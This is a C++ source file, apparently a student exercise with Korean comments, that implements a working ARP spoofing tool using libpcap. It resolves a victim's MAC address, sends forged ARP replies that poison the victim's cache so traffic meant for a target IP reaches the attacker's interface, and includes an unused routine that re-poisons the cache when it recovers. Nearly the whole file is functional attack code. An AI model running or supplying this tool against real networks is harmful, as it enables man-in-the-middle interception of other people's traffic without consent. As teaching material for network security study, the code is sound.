#include <iostream> // std, namespace 사용
#include <stdexcept>
#include <array>
#include <cstdio>
#include <pcap.h>
#include <string>
#include <vector>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

/* 사용법 출력 */
void usage() {
    printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip2>...]\n");
    printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

using namespace std; // 를 생략할 수 있게 해준다

/* 네트워크 인터페이스 'iface'의 MAC 주소를 가져옴 */
//멘토님 피드백 - MAC 주소를 가져와 문자열로 변환 후 다시 MAC 클래스 객체로 변환하는 과정은 불필요하다.

array<unsigned char, 6> get_mac_address(const string& iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd == -1) {
        throw runtime_error("소켓 생성 실패");
    }

    struct ifreq ifr = {};
    strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ -1);
    ifr.ifr_name[IFNAMSIZ -1] = '\0';
    /* memset 대신에 구조체 선언과 초기화를 동시에 할 수 있음
       strncpy는 제한된 문자 길이만큼의 데이터가 삽입될 경우 
       공백 문자가 들어가지 않을 수 있기 때문에 명시적으로 공백 문자를 넣어준다. */

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        close(fd);
        throw runtime_error("IOCTL 요청 실패");
    }

    close(fd);
    
    /* static_cast - 타입 변환을 안전하게 수행 */
    array<unsigned char, 6> mac_address = {
        static_cast<unsigned char>(ifr.ifr_hwaddr.sa_data[0]),
        static_cast<unsigned char>(ifr.ifr_hwaddr.sa_data[1]),
        static_cast<unsigned char>(ifr.ifr_hwaddr.sa_data[2]),
        static_cast<unsigned char>(ifr.ifr_hwaddr.sa_data[3]),
        static_cast<unsigned char>(ifr.ifr_hwaddr.sa_data[4]),
        static_cast<unsigned char>(ifr.ifr_hwaddr.sa_data[5])
    };

    return mac_address;
}

array<unsigned char, 4> get_ip_address(const string& iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd == -1) {
        throw runtime_error("소켓 생성 실패");
    }

    struct ifreq ifr = {};
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ -1);
    ifr.ifr_name[IFNAMSIZ -1] = '\0';

    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {  // 여기서 SIOCGIFADDR 사용
        close(fd);
        throw runtime_error("IOCTL 요청 실패");
    }

    close(fd);

    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;

    array<unsigned char, 4> ip_address = {
        static_cast<unsigned char>(ipaddr->sin_addr.s_addr & 0xFF),
        static_cast<unsigned char>((ipaddr->sin_addr.s_addr >> 8) & 0xFF),
        static_cast<unsigned char>((ipaddr->sin_addr.s_addr >> 16) & 0xFF),
        static_cast<unsigned char>((ipaddr->sin_addr.s_addr >> 24) & 0xFF)
    };

    return ip_address;
}

/* ARP 요청 */
void send_arp_request(pcap_t* handle, Mac my_mac, Ip my_ip, Ip target_ip) {
    EthArpPacket packet;
    
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(target_ip);

    if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)) != 0) {
        throw runtime_error("ARP 요청 송신 실패: " + string(pcap_geterr(handle)));
    }
}

Mac get_mac_from_reply(pcap_t* handle, const Ip& sender_ip) {
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        int res = pcap_next_ex(handle, &header, &recv_packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            throw runtime_error("패킷 캡쳐 실패: " + string(pcap_geterr(handle)));
        }

        EthArpPacket* recv_etharp = (EthArpPacket*)recv_packet;
        if (recv_etharp->eth_.type_ == htons(EthHdr::Arp) && recv_etharp->arp_.op_ == htons(ArpHdr::Reply)) {
            if (recv_etharp->arp_.sip() == sender_ip) {
                return recv_etharp->eth_.smac();
            }
        }
    }
}

void send_arp_reply(pcap_t* handle, const Mac& my_mac, const Ip& my_ip, const Mac& target_mac, const Ip& sender_ip, const Ip& target_ip) {
    EthArpPacket packet;
    packet.eth_.dmac_ = target_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = target_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)) != 0) {
        throw runtime_error("ARP 응답 송신 실패: " + string(pcap_geterr(handle)));
    }
}

void arp_recover(pcap_t* handle, const Mac& my_mac, const Ip& my_ip, const Mac& sender_mac, const Ip& sender_ip, const Ip& target_ip) {
    cout << "waiting" << endl;
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        int res = pcap_next_ex(handle, &header, &recv_packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            cerr << "캡쳐 실패: " << pcap_geterr(handle) << endl;
            break;
        }

        EthArpPacket* recv_etharp = (EthArpPacket*)recv_packet;
        if (recv_etharp->eth_.type_ == htons(EthHdr::Arp) && recv_etharp->arp_.op_ == htons(ArpHdr::Request)) {
            // ARP 요청 패킷이 감지되었을 때, 네트워크가 복구된 것으로 간주하고 다시 ARP 스푸핑 수행
            //이때 reply를 안보내면 sender가 target에게 진짜 ip를 알려주기 때문에 재빠르게 reply를 보내준다.
            if (recv_etharp->arp_.tip() == target_ip) {
                cout << "detect recover and resend" << endl;
                send_arp_reply(handle, my_mac, my_ip, sender_mac, sender_ip, target_ip);
                break; // 다시 스푸핑 패킷을 보내고 종료
            }
        }
    }
}

int main(int argc, char* argv[]) {
    try {
        if (argc < 4 || (argc % 2) != 0) {
            usage();
            return EXIT_FAILURE;
        }

        string dev = argv[1];
        vector<Ip> sender_ips;
        vector<Ip> target_ips;

        for (int i = 2; i < argc; i += 2) {
            sender_ips.emplace_back(argv[i]);
            target_ips.emplace_back(argv[i + 1]);
        }

        Mac my_mac(get_mac_address(dev).data());

        // 하... 처음부터 uint로 받을걸
        array<unsigned char, 4> my_ip_array = get_ip_address(dev);
        uint32_t my_ip_uint = 
            (static_cast<uint32_t>(my_ip_array[0]) << 24) |
            (static_cast<uint32_t>(my_ip_array[1]) << 16) |
            (static_cast<uint32_t>(my_ip_array[2]) << 8)  |
            static_cast<uint32_t>(my_ip_array[3]);

        Ip my_ip(my_ip_uint);

        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);
        if (handle == nullptr) {
            throw runtime_error("Couldn't open device " + dev + " (" + errbuf + ")");
        }

        for (size_t i = 0; i < sender_ips.size(); ++i) {
            send_arp_request(handle, my_mac, my_ip, sender_ips[i]);
            Mac sender_mac = get_mac_from_reply(handle, sender_ips[i]);

            send_arp_reply(handle, my_mac, my_ip, sender_mac, sender_ips[i], target_ips[i]);
        }

        pcap_close(handle);
    } catch (const exception& ex) {
        cerr << "Error: " << ex.what() << endl;
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
